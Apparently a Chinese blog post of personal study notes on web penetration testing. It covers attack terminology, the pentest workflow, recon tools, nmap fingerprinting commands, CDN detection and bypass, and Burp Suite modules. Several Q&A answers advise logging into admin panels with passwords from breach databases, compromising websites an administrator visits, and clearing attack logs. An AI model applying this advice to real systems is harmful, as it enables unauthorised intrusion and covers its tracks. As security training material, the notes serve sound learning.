    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="前言："><a class="header-anchor" href="#前言：">¶</a>前言：</h3><p>学习了很多渗透方面的知识，但是本人又不喜欢复习，感觉理论知识非常欠缺（本人记性不好，忘性很大😫😫😫）尤其是自己组织语言，所以这里对知识进行一个<strong>大体</strong>的系统的总结。</p><hr><h1>Web渗透</h1><h2 id="一、安全术语（行业黑话）"><a class="header-anchor" href="#一、安全术语（行业黑话）">¶</a>一、安全术语（行业黑话）</h2><ol><li><p><strong>肉鸡</strong>:</p></li><li><p><strong>僵尸网络</strong>：僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感 染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络僵尸网络是一个非常形象的比喻，众多的计算机在不知不 觉中如同中国古老传说中的僵尸群一样被人驱赶和指挥着，成为被 攻击者执行各类恶意活动（DDOS、垃圾邮件等）利用的一种基础 设施。</p></li><li><p><strong>木马</strong>：木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。</p></li><li><p><strong>网页木马</strong>:伪装成网页文件或直接插入正常的网页文件中，当有人访问或执行时，就会利用对方系统或浏览器的漏洞自动下载木马到访问者的电脑上执行。</p></li><li><p><strong>蠕虫病毒</strong>：它是一类相对独立的恶意代码，利用了联网系统的开放性特点，通过可远程利用的漏洞自主地进行传播，受到控制终端会变成攻击的发起方，尝试感染更多的系统。蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。</p></li><li><p><strong>震网病毒</strong>：名 Stuxnet 病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。作为世界上首个网络“超级破坏性武器”，Stuxnet 的计算机病毒已经感染了全球超过 45000 个网络，其目标伊朗的铀浓缩设备遭到的攻击最为严重。</p></li><li><p><strong>C2</strong>：C2 全称为 Command and Control，命令与控制，常见于 APT 攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。 供应链攻击是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。</p></li><li><p><strong>APT 攻击</strong>：Advanced Persistent Threat，即<strong>高级可持续威胁攻击</strong>，指某组织在网络上对特定对象展开的持续有效的攻击活动。</p></li><li><p><strong>嗅探</strong>：　嗅探指窃听网络中流经的数据包，这里的网络一般指用集线器或路由器组建的局域网。通过嗅探并解析数据包，便可知道数据包中的信息，一旦含有账户密码等隐私信息就可能造成个人资金损失。</p></li><li><p><strong>水坑攻击</strong>：黑客通过分析被攻击者的网络活动规律，寻找被攻击者经常访问的网站的弱点，先攻下该网站并植入攻击代码，等待被攻击者来访时实施攻击。</p></li><li><p><strong>钓鲸攻击</strong>：攻击者针对高层，如首席执行官，首席财务官和首席运营官。钓鲸的目标是经过精心挑选的，因为受害者价值很高，而被盗的信息将比普通员工提供的信息更有价值。钓鲸需要依赖于社交工程，攻击者需要更好地了解目标。</p></li><li><p><strong>鱼叉攻击</strong>：鱼叉式攻击是一种较为高级的网络钓鱼攻击手法，针对特定的目标或组织，借助构造特定主题和内容的邮件、短信等第三方媒介，吸引特定目标群体打开链接或下载附件等方式的钓鱼攻击行为。</p></li><li><p><strong>网络钓鱼</strong>：在网络钓鱼过程中，攻击者使用诱饵（如电子邮件、手机短信、QQ链接等）将攻击代码发送给大量用户，期待少数安全意识弱的用户“上钩”，进而达到“钓鱼”（如窃取用户的隐私信息）的目的。</p></li><li><p><strong>反弹端口</strong>：是指受害者服务器的某一个端口不能访问，我们通过反弹端口的形式，让攻击者能够访问该端口，也叫端口转发</p></li><li><p><strong>DDoS</strong>：DDoS攻击一般指分布式拒绝攻击，是一种攻击者操纵大量计算机，或位于不同位置的多个攻击者，在短时间内通过将攻击伪装成大量的合法请求，向服务器资源发动的攻击，导致请求数量超过了服务器的处理能力，造成服务器运行缓慢或者宕机。通常由僵尸网络用于执行此恶意任务，由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击。<br><strong>软件脱壳</strong>：壳是用来保护计算机软件不被非法修改或编译的程序；</p></li><li><p><strong>缓冲区溢出</strong>：指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。程序崩溃、导致拒绝服务、</p><p>​    跳转并且执行一段恶意代码。造成缓冲区溢出的主要原因是程序中没有仔细检查用户输入。</p></li><li><p><strong>挂马</strong>：</p></li><li><p>挂马攻击是指攻击者在已经获得控制权的网站的网页中嵌入恶意代码（通常是通过IFrame、Script引用来实现），当用户访问该网页时，嵌入的恶意代码利用浏览器本身的漏洞、第三方ActiveX漏洞或者其它插件（如Flash、PDF插件等）漏洞，在用户不知情的情况下下载并执行恶意木马。</p></li><li><p><strong>0/1/N Day 漏洞</strong>:</p></li><li><p><strong>后门</strong>:</p></li><li><p><strong>攻击载荷（payload）</strong>:</p></li><li><p><strong>Rootkit</strong>：是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。</p></li><li><p><strong>横移</strong>：横向移动是网络攻击者使用的一种常见策略，用于在整个网络中旋转，以便访问受害组织的敏感信息和用户信息。</p><p>威胁行为者获得公司网络的访问权限后，通常会尝试通过横向移动和侦察收集尽可能多的有关组织的信息，包括关键信息的位置、用户活动、如何获得特权以及如何避免被发现。</p></li><li><p><strong>渗透</strong>：</p></li><li><p><strong>跳板</strong>:</p></li><li><p><strong>暗链</strong>：暗链又叫隐藏链接，指的是正常的链接通过一些方法，如：把链接放入js代码中，使用display:none等等，从而使用户在正常浏览网页的时候无法看到这个链接。暗链是对搜索引擎的一种欺骗，导致搜索引擎的误判，将高权重分配给原本没有价值的网站甚至是钓鱼网站。</p></li><li><p><strong>拖库</strong>：拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库文件，拖库的主要防护手段是数据库加密。</p></li><li><p><strong>CC 攻击（Challenge Collapsar）</strong>：CC攻击算得上是应用层的DDoS，而且是经过TCP握手协议之后，CC的攻击原理很简单，就是模拟多个用户对一些资源消耗较大的页面不断发出请求，从而达到消耗服务器资源的目的，当服务器一直都有处理不完的大量数据请求时，服务器资源浪费过多，就会造成堵塞，而正常用户的访问也会被终止，网站陷入瘫痪状态。</p></li><li><p><strong>欺骗攻击</strong>：网络欺骗的技术主要有：HONEYPOT 和分布式 HONEYPOT、欺骗空间技术等。 主要方式有：IP 欺骗、ARP 欺骗、 DNS 欺骗、Web 欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。</p></li><li><p><strong>社会工程学</strong>：一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。</p></li><li><p><strong>老三样</strong>：通常指 IDS、防火墙和反病毒三样历史最悠久安全产品。</p></li><li><p>**堡垒机：**运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。数据库审计 能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。 它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。</p></li><li><p>**VPN：**虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。</p></li><li><p><strong>蜜罐（Honeypot）</strong>：是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。 由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。</p></li><li><p><strong>沙箱</strong>：沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。 非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。</p></li><li><p><strong>沙箱逃逸</strong>：一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象</p></li><li><p>**南北向流量：**通常指数据中心内外部通信所产生的的流量。</p></li><li><p><strong>东西向流量</strong>：通常指数据中心内部不同主机之间互相通信所产生的的流量。</p></li></ol><h2 id="二、信息收集"><a class="header-anchor" href="#二、信息收集">¶</a>二、信息收集</h2><blockquote><p>当你能够收集足够多的信息，你已经完成了渗透的60%。——我说的</p></blockquote><p>**什么是渗透测试：**渗透测试就是通过模拟真实得黑客攻击来检测信息系统得安全性。</p><p>**目的：**侵入系统或挖掘漏洞获取机密信息将入侵的过程和细节产生报告提供给用户，由此确定客户系统中所存在的安全威胁，并能够及时提醒安全管理员完善安全策略，降低安全风险。</p><p><strong>渗透测试得类型</strong>：黑盒测试、白盒测试、灰盒测试</p><ul><li><strong>黑盒</strong>：称功能测试，渗透者完全处于对系统一无所知的状态。完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具进行测试，揭示目标网络中一些已知或未知的安全漏洞。</li><li><strong>白盒</strong>：测试者可以通过正常的渠道向被测单位索要各种资料信息，包括（账户、网站源码、拓扑等信息）这类测试的目的是模拟企业内部雇员的越权操作。</li><li><strong>灰盒</strong>： 是白盒测试和黑盒测试基本类型的组合，它可以提供对目标系统更加深入和全面的安全审查。组合之后的好处就是能够同时发挥两种渗透测试方法的各自优势。</li></ul><h3 id="Web渗透测试流程"><a class="header-anchor" href="#Web渗透测试流程">¶</a>Web渗透测试流程</h3><ul><li>**获取授权/确认目标：**要有盖章授权书/与客户沟通好渗透测试的范围；</li><li>**信息收集：**从WEB层面/系统层面展开信息搜集；</li><li>**漏洞测试：**使用APPSCAN/AWVS/NESSUS/ xray/nucli/挖掘到漏洞</li><li>**漏洞利用：**利用漏洞获取WebShell(网站后门)</li><li>**权限提升：**www-data --&gt; root  /  IIS-USER --&gt; System</li><li>**权限维持：**系统后门/…</li><li>**痕迹清理：**WEB攻击日志/系统攻击日志 清楚掉</li><li>**撰写报告：**将攻击过程写道WORD文档提交SRC</li></ul><h3 id="信息收集内容"><a class="header-anchor" href="#信息收集内容">¶</a>信息收集内容</h3><h4 id="分类："><a class="header-anchor" href="#分类：">¶</a>分类：</h4><p><strong>主动式信息搜集（可获取到的信息较多，但易被目标发现）</strong><br>通过直接发起与被测目标网络之间的互动来获取相关信息，如通过Nmap扫描目标系统。</p><p><strong>被动式信息搜集（搜集到的信息较少，但不易被发现）</strong><br>通过第三方服务来获取目标网络相关信息。如通过搜索引擎方式来搜集信息。</p><h4 id="Web层面"><a class="header-anchor" href="#Web层面">¶</a>Web层面</h4><blockquote><p>通常来说，平时挖src的时候，最坏的情况就是只能获取一个IP地址，但一般情况下进行渗透测试都会得到一个域名。</p></blockquote><ol><li><h5 id="IP反查域名："><a class="header-anchor" href="#IP反查域名：">¶</a><strong>IP反查域名</strong>：</h5><p>Reverse IP Lookup：<a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a></p><p>爱站网：<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></p><p>站长之家：<a href="https://stool.chinaz.com/same/">https://stool.chinaz.com/same/</a></p></li><li><h5 id="ICP备案："><a class="header-anchor" href="#ICP备案：">¶</a><strong>ICP备案</strong>：</h5><p>工信部：<a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">https://beian.miit.gov.cn/#/Integrated/recordQuery</a></p></li><li><h5 id="Whois信息："><a class="header-anchor" href="#Whois信息：">¶</a><strong>Whois信息</strong>：</h5><blockquote><p>在渗透测试中可通过whois查询我们可以查询到注册商、注册人、邮件、DNS解析服务器、注册人联系电话等信息；</p></blockquote><p><a href="http://xn--who-ok6ez9gts1e.is">国外的who.is</a>：<a href="https://who.is/">https://who.is/</a><br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>爱站网：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>腾讯云：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a><br>美橙互联：<a href="https://whois.cndns.com/">https://whois.cndns.com/</a><br>爱名网：<a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a><br>易名网：<a href="https://whois.ename.net/">https://whois.ename.net/</a><br>中国万网：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>西部数码：<a href="https://whois.west.cn/">https://whois.west.cn/</a><br>新网域名：<a href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a><br>纳网域名：<a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br>中资源域名：<a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a><br>三五互联域名：<a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a><br>新网互联域名：<a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p></li><li><h5 id="子域名信息："><a class="header-anchor" href="#子域名信息：">¶</a><strong>子域名信息：</strong></h5><blockquote><p>为什么要收集子域呢？假设目标资产数量庞大，一般来说主域都是防护重点，管理上可能会谨慎，防护也相对严格，因此从子域名入手便成了很好的选择，子域往往在防护上会相对更加的松懈，然后再慢慢向目标系统渗透，所以子域名的收集便显得尤为的重要。（中路站了5个人打不过，你还不会从边路偷家？😏）</p></blockquote><p>域名分为根域名和子域名：一般查询子域的时候我们需要知道他的顶级域名。<a href="http://xn--baidu-gv5ij80i.com">比如baidu.com</a>（没有WWW），但是有时也比较特殊，比如tyut.edu.cn也算是顶级域名。</p><p><strong>线上工具：</strong></p><p>可以通过网络空间测绘进行搜索；也有专门的网站：</p><p>DNSDB：<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>在线子域名查询：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br>ip或域名查询：<a href="https://site.ip138.com/">https://site.ip138.com/</a><br>子域名扫描：<a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a><br>Aleax网站：<a href="https://alexa.chinaz.com/">https://alexa.chinaz.com/</a><br>securitytrails：<a href="https://securitytrails.com/list/apex_domain/www.baidu.com">https://securitytrails.com/list/apex_domain/www.baidu.com</a><br>dns侦测：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p>○ findsubdomains：<a href="https://findsubdomains.com/">https://findsubdomains.com/</a>        //好使</p><p>○ netcraft：<a href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a>          //好使<br>○ 百度云观测：<a href="http://ce.baidu.com/index/getRelatedSites?site_address=%7Bdomain%7D">http://ce.baidu.com/index/getRelatedSites?site_address={domain}</a>  //好使<br>○ hackertarget：<a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a>   //好使</p><p># 威胁情报平台<br>AlienVault：<a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a><br>RiskIQ 社区版：<a href="https://community.riskiq.com/">https://community.riskiq.com/</a><br>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="http://ThreatMiner.org">ThreatMiner.org</a>：<a href="https://www.threatminer.org/domain.php?q=%7Bdomain%7D">https://www.threatminer.org/domain.php?q={domain}</a><br>VT：<a href="https://www.virustotal.com/gui/domain/%7Bdomain%7D/relations">https://www.virustotal.com/gui/domain/{domain}/relations</a><br><a href="http://Pentest-Tools.com">Pentest-Tools.com</a>：<a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain#">https://pentest-tools.com/information-gathering/find-subdomains-of-domain#</a></p><p><strong>线下工具：</strong></p><ol><li>Layer子域名挖掘机：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></li><li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li><li>subDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li>theHarvester（kali自带综合搜索工具）</li></ol></li><li><h5 id="旁站-C段-信息"><a class="header-anchor" href="#旁站-C段-信息">¶</a><strong>旁站/C段 信息</strong></h5><blockquote><p>旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么<em>攻击者就可以通过在<strong>与目标站点同一服务器下的站点渗透</strong></em>，从而获取目标站点的权限，这过程就是旁注攻击；</p><p>C段指的是<em><strong>同一内网段内的其他服务器</strong></em></p></blockquote><p>**在线工具：**fofa、shodan等</p><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p><p><a href="http://www.5kik.com/">http://www.5kik.com/</a></p><p><strong>线下工具：</strong></p><p>k8：<a href="https://github.com/k8gege/K8CScan%EF%BC%88%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%9ALadon">https://github.com/k8gege/K8CScan（最新版：Ladon</a> <a href="https://github.com/k8gege/Ladon%EF%BC%89">https://github.com/k8gege/Ladon）</a></p><p>御剑1.5：</p></li><li><h5 id="CMS（Content-Management-System）"><a class="header-anchor" href="#CMS（Content-Management-System）">¶</a><strong>CMS</strong>（Content Management System）</h5><p>cms识别：</p><p>​国外识别平台：<a href="https://whatcms.org/">https://whatcms.org/</a><br>​国内识别平台：<br>​bugscaner：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a><br>​whatweb：<a href="https://www.whatweb.net/">https://www.whatweb.net/</a><br>云悉：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a><br>​    潮汐：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a><br>TSscan:<a href="https://scan.dyboy.cn/web/">https://scan.dyboy.cn/web/</a></p><p>线下识别工具：</p><p>​CMSMap：<a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a></p><p>​EHole：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p>​CMSeeK：<a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p><p>​Whatweb（kali自带）</p><p>插件：</p><p>​wappalyzer：<a href="https://www.wappalyzer.com">https://www.wappalyzer.com</a><br>​whatruns：<a href="https://www.whatruns.com/">https://www.whatruns.com/</a></p></li></ol><h4 id="操作系统层面"><a class="header-anchor" href="#操作系统层面">¶</a>操作系统层面</h4><ol><li><h5 id="OS判断："><a class="header-anchor" href="#OS判断：">¶</a><strong>OS判断</strong>：</h5><ol><li><p>TTL判断（不准确且可以修改误导）</p></li><li><p>Linux对大小写敏感，windows对大小写不敏感</p></li><li><p>Nmap系统指纹识别</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">nmap -<span class="hljs-built_in">sS</span> -Pn -O <span class="hljs-built_in">ip</span><br>nmap -<span class="hljs-built_in">sS</span> -sV <span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure></li></ol></li><li><h5 id="开放端口："><a class="header-anchor" href="#开放端口：">¶</a><strong>开放端口</strong>：</h5><p>在线端口扫描：<a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p>Nmap扫描</p></li><li><h5 id="中间件："><a class="header-anchor" href="#中间件：">¶</a><strong>中间件：</strong></h5><blockquote><p>IIS、Apache、Nginx、Tomcat、Weblogic、Jboss、WebSphere、Jetty…</p></blockquote><p>\1. HTTP相应数据包中查看Server字段   * BP抓包  * F12  * curl <a href="http://www.baidu.com">http://www.baidu.com</a> -i &gt; ip.txt<br>\2. 根据报错信息判断，访问为存在页面<br>\3. 根据默认页面判断，“Welcome to nginx”<br>\4. 通过端口服务探测，Tomcat/Jboss–&gt;8080端口   Weblogic–&gt;7001端口</p></li><li><h5 id="数据库"><a class="header-anchor" href="#数据库">¶</a><strong>数据库</strong></h5><p>数据库默认端口:<br>SQl Server --&gt; 1433<br>MySQL      --&gt; 3306<br>Oracle     --&gt; 1521<br>DB2        --&gt; 5000<br>PostGreSQL --&gt; 5432<br>MongoDB    --&gt; 27017<br>Redis      --&gt; 6379</p></li><li><h5 id="WAF-防火墙识别"><a class="header-anchor" href="#WAF-防火墙识别">¶</a><strong>WAF/防火墙识别</strong></h5></li></ol><p>​Nmap识别：</p><pre><code class="hljs">nmap -p 80,443 --script=http-waf-detect 目标主机nmap -p 80,443 --script=http-waf-fingerprint 目标主机（精度更高）</code></pre><p>​Wafw00f：<a href="https://github.com/enablesecurity/wafw00f">https://github.com/enablesecurity/wafw00f</a><br>​IdentYwaf：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p><p>​看图识别WAF：<a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</a></p><ol start="6"><li><h5 id="CDN识别与验证："><a class="header-anchor" href="#CDN识别与验证：">¶</a><strong>CDN识别与验证：</strong></h5><p>各地ping：</p><p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一，多半是使用了CDN；</p><p>国内在线：<br>CDN云观测：<a href="http://cdn.chinaz.com/">http://cdn.chinaz.com/</a><br>超级ping：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br>爱站：<a href="https://ping.aizhan.com/">https://ping.aizhan.com/</a><br>17ce：<a href="https://www.17ce.com/">https://www.17ce.com/</a></p></li></ol><p>​国外在线：<br>​cdnplanet：<a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a><br>​    站长工具：<a href="http://tool.chinaz.com/speedworld/">http://tool.chinaz.com/speedworld/</a><br>ping：<a href="http://www.ping.pe/">http://www.ping.pe/</a></p><p>​Nslookup：</p><p>​使用 nslookup 命令进行检测，原理同ping，如果返回域名解析对应多个 IP 地址多半是使用了 CDN；</p><h3 id="问题"><a class="header-anchor" href="#问题">¶</a>问题</h3><h4 id="终极问题：你如何进行信息收集？"><a class="header-anchor" href="#终极问题：你如何进行信息收集？">¶</a>终极问题：你如何进行信息收集？</h4><p>​一般来说进行渗透测试都会拿到目标网站的一个根域名。首先我会根据根域名利用线上和线下工具对目标站点的子域名进行信息收集。线上通过如DNSDB、fofa、shodan、钟馗之眼、微步等进行查询，线下工具会利用Layer子域名挖掘机、oneforall以及kali自带的theHarvester进行子域名收集；然后通过一些工具去收集域名对应的真实IP，可能需要利用一些线上工具进行CDN绕过，拿到真实的IP之后对上面的开发的端口进行，看看都有哪些服务，然后利用dirsearch、wwwscan、御剑等工具对收集到域名进行目录扫描，去发现更多可能存在的路径，比如后台登录或者敏感配置文件路径如.git源码泄露；利用爱站、站长之家、探测一下该站点是否存在旁站，用Nmap、goby去收集真实的ip的c段信息，探测站点的指纹信息，收集一下CMS的版本信息，操作系统是win/linux，后端语言是java还是php等。还有就是收集一些资产信息，通过whois查询查找域名注册人、邮箱、电话等信息，如果可以定位到当前资产对于企业，还可以去企查查、天眼查、爱企查收集更多的关于企业的资产信息，比如该企业下运行的app，微信小程序等。</p><p><strong>渗透思路？</strong></p><p>零、获取授权</p><p>一、信息收集</p><ol><li><p>获取域名的 whois 信息 , 获取 注册者 邮箱 姓名 电话 等。</p></li><li><p>通过 DNS 域传送漏洞、备案号查询、SSl 证书、APP反编译、微信公众号、子域名在线查询、子域名挖掘机、DNS 历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业域名与 ip。</p></li><li><p>获取ip之后可以通过ping和超级ping的方式查看是否存在cdn和waf, cdn通过ping一个不存在的二级域名或者国外ping可以得到ip , waf的话通过一个叫wafwOOf的python脚本识别 , 然后再针对绕过</p></li><li><p>通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如 php 探针、管理员备份文件。</p></li><li><p>google hack语法 进一步探测网站的信息，后台，敏感文件</p></li><li><p>敏感信息收集，如 github 源码、用 7kb、扫源代码泄露（.hg、.git、cvs、svn、.DS_store 源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟馗之眼、天眼查、威胁情报、微步在线，js等</p></li><li><p>通过Wappalyzer、御剑工具、云悉指纹 、bugscan在线对网站指纹识别（包括，cms，cdn，证书等）</p></li><li><p>nmap扫描获取端口 , 获取真实ip</p></li><li><p>goby 扫描资产信息</p></li><li><p>通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，apache , nginx 的解析漏洞</p></li></ol><p>二、漏洞检测</p><ol><li><p>用 AWVS、appscan、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 sql,xss,xxe 注入，代码执行，命令执行，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p></li><li><p>用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行漏洞验证，如ms08- 067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</p></li></ol><p>三、漏洞利用</p><p>利用各种nday和常见漏洞拿到  webshell或者其他权限</p><p>四、权限提升</p><p>windows和linux根据版本号系统漏洞提权，除此之外windows还可以利用计划任务等自启动劫持来提权，如果需要绕过uac可以uac提权，也可以令牌伪造提权；linux一般还可以sudo和suid提权，也可以通过计划任务等启动项劫持提权；</p><p>五、权限维持</p><p>六、日志清理</p><p>操作系统、中间件、数据库等日志进行清除</p><p>七、总结报告及修复方案</p><p>渗透测试报告一般包含高中危漏洞数量，存在漏洞的地址，漏洞的额复现过程，漏洞导致的危害，修复建议；</p><p><strong>敏感信息收集</strong></p><p>域名和⼦域名：收集⽬标⽹站的域名和⼦域名信息，可以使⽤WHOIS查询、DNS查找等⼯具。</p><p>IP地址和服务器信息：获取⽬标⽹站的IP地址、服务器类型和版本等信息，可以使⽤IP扫描⼯具、端</p><p>⼝扫描等⽅法。</p><p>⽹站⽬录和⽂件：查找⽹站中隐藏的⽬录和⽂件，包括备份⽂件、配置⽂件等。可以使⽤⽬录爆破⼯</p><p>具、Web爬⾍等。</p><p>员⼯信息：搜集与⽬标组织相关的员⼯信息，包括姓名、职位、联系⽅式等。可以使⽤搜索引擎、社</p><p>交媒体等途径。</p><p>敏感⽂件和配置信息：搜索⽹站中可能泄露的敏感⽂件，例如数据库备份、配置⽂件、敏感⽂档等。</p><p>可以使⽤搜索引擎、⽂件爆破⼯具等⽅式。</p><p>系统漏洞和补丁情况：了解⽬标系统的漏洞和补丁情况，可以使⽤漏洞扫描⼯具、安全公告等资源。</p><p>社会⼯程学信息：了解⽬标组织的员⼯、供应商、合作伙伴等信息，包括联系⽅式、社交活动等。可</p><p>以通过物理调查、社交媒体等⽅式收集。</p><p><strong>在渗透过程中，收集目标站注册人邮箱对我们有什么价值？</strong></p><p>丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。</p><p>利用搜索到的关联信息找出其他邮进而得到常用社交账号。</p><p>社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p><p>观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西</p><p><strong>怎么判断一个网站是否存在cdn , 以及绕过绕过方式？</strong></p><p>判断cdn</p><ol><li><p>通过nslookup可以查看 , 如果存在cdn的话 , 会有cdn的域名</p></li><li><p>通过超级ping , 不同地区如果返回的ip不一样, 说明存在cdn</p></li></ol><p>绕过cdn</p><ol><li><p>现在一般cdn都开启了泛域名解析 , 可以通过ping一个不存在的二级域名</p></li><li><p>通过DNS历史查询 , 查询是否存在部署cdn之前的域名解析记录</p></li><li><p>通过ssl证书查询真实ip</p></li><li><p>通过fofa 这种网路空间搜索引擎查询真实IP</p></li><li><p>通过网站的邮件订阅里面查看真实ip</p></li><li><p>通过国外服务器ping对方网站 , 一般不会在国外部署cdn</p></li></ol><h1>基础黑客工具的使用</h1><h2 id="BurpSuite"><a class="header-anchor" href="#BurpSuite">¶</a>BurpSuite</h2><h3 id="Burpsuite常用的模块"><a class="header-anchor" href="#Burpsuite常用的模块">¶</a>Burpsuite常用的模块</h3><p><strong>DashBoard模块(仪表盘)</strong></p><p><strong>Target模块(目标)</strong></p><p>Target 组件主要包含站点地图、目标域、Target工具三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息</p><p><strong>Proxy模块(代理)</strong></p><p>是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p><p><strong>Intruder模块(入侵)</strong>：</p><p>可配置的工具，对web应用程序进行自动化攻击。此功能有多种用途，如漏洞利用、Web应用程序模糊测试、进行暴力破解等</p><p><strong>Repeater模块(重放)</strong></p><p>手动操作来触发单独的HTTP请求，并进行应用程序响应的工具。此功能用于根据不同的情况修改和发送相同的请求并分析，通过调整Request的参数，不断尝试，通过Response查看状态。从而节省在浏览器中操作的时间。</p><p><strong>Sequencer模块(序列器)</strong></p><p>Burp Sequencer是一种用于分析数据样本随机性质量的工具。可以用它测试程序的会话令牌(Session token)、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能够很好的降低这些关键数据被伪造的风险。 (2):Burp Sequencer主要由信息截取(Live Capture)、手动加载(Manual Load)和选项分析(Analysis Options)三个模块组成。 